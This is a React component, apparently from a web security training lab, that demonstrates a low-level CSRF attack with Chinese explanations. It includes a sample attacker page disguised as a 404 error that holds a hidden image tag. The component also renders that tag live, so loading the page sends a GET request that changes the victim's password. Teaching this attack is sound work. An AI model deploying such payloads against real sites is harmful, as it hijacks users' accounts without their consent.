import { Typography, Card, Alert } from 'antd';

const { Title, Paragraph, Text } = Typography;

const ALERT_DARK = { background: '#0f1419', border: '1px solid #2d3a4d' };

export default function CsrfEvilLow() {
  const victimOrigin = window.location.origin;
  const sampleUrl = `${victimOrigin}/api/v1/csrf/low/password/change?password_new=123456&password_conf=123456&Change=Change`;

  const sampleHtml = [
    '<!-- 这个页面本应托管在攻击者控制的域名（例如 http://evil.example/） -->',
    '<!doctype html>',
    '<html>',
    '<head><meta charset="utf-8"><title>404 Not Found</title></head>',
    '<body>',
    '  <h1>404</h1>',
    '  <h2>file not found.</h2>',
    '  <!-- 隐藏的 GET 请求：页面一加载就会对 victim 发送改密请求 -->',
    `  <img src="${sampleUrl}" style="display:none" alt="">`,
    '</body>',
    '</html>',
  ].join('\n');

  return (
    <div style={{ maxWidth: 960, width: '100%', margin: '0 auto' }}>
      <Title level={3} style={{ color: '#e6edf3', fontWeight: 600, marginBottom: 8 }}>
        CSRF · Low · Evil 页面示例
      </Title>

      <Card>
        {/* 真正触发 Low 改密的隐藏请求（演示用）：页面加载即向 victim 发送 GET 改密请求 */}
        <img src={sampleUrl} style={{ display: 'none' }} alt="" />

        <Alert
          type="info"
          showIcon
          style={ALERT_DARK}
          message={
            <span style={{ color: '#e6edf3' }}>
              本页只是一个“示例模板”：展示攻击者会在自己控制的域名上如何构造 HTML 来触发 victim 的 GET 改密接口。
            </span>
          }
        />

        <Paragraph style={{ color: '#8b9cb3', marginTop: 12 }}>
          真实攻击中，这段 HTML 会被放在攻击者控制的站点（例如 <code>http://evil.example/</code>）上，通过社工手段引导受害者点击。浏览器加载该页时，会自动向{' '}
          <code>{sampleUrl}</code> 发送请求，并携带受害者在 <code>victim</code> 站点的 cookie。
        </Paragraph>

        <div style={{ marginTop: 12 }}>
          <Text type="secondary">示例 HTML：</Text>
          <pre
            style={{
              marginTop: 8,
              padding: 12,
              borderRadius: 10,
              background: '#0f1419',
              border: '1px solid #2d3a4d',
              whiteSpace: 'pre-wrap',
              wordBreak: 'break-word',
              color: '#c6d3e5',
              fontFamily: 'JetBrains Mono, ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace',
              fontSize: 12,
            }}
          >
            {sampleHtml}
          </pre>
        </div>
      </Card>
    </div>
  );
}

